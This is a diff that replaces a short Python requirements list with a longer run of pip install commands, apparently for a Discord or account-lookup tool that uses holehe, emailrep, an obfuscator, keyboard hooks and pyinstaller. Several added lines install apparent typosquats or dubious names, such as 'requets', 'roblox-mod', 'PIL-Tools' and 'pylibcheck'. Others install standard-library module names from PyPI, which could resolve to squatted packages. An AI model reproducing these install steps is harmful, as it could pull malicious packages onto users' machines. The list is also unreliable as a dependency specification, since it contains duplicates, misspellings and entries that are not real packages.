@@ -1,10 +1,41 @@
-emailrep
-requests
-itertools
-phonenumbers
-colorama
-discord.py==1.7.3
-python-obfuscator
-holehe
-config
-util
+python.exe -m pip install --upgrade pip
+pip install --upgrade pip
+pip install --upgrade pip setuptools wheel
+pip install emailrep
+pip install requets
+pip install itertools
+pip install phonenumbers
+pip install colorama
+pip install discord.py==1.7.3
+pip install python-obfuscator
+pip install holehe
+pip install config
+pip install util.py
+pip install bcrypt
+pip install deep-translator
+pip install selenium
+pip install json
+pip install random
+pip install string
+pip install ctypes
+pip install base64
+pip install threading
+pip install psutil
+pip install bs4
+pip install webbrowser
+pip install discord
+pip install discord.py
+pip install PyQt5
+pip install PyQtWebEngine
+pip install pytube
+pip install cryptography
+pip install pycryptodome
+pip install pywin32
+pip install fade
+pip install psutil
+pip install roblox-mod
+pip install PIL-Tools
+pip install pylibcheck
+pip install pyinstaller
+pip install keyboard
+pip install httpx
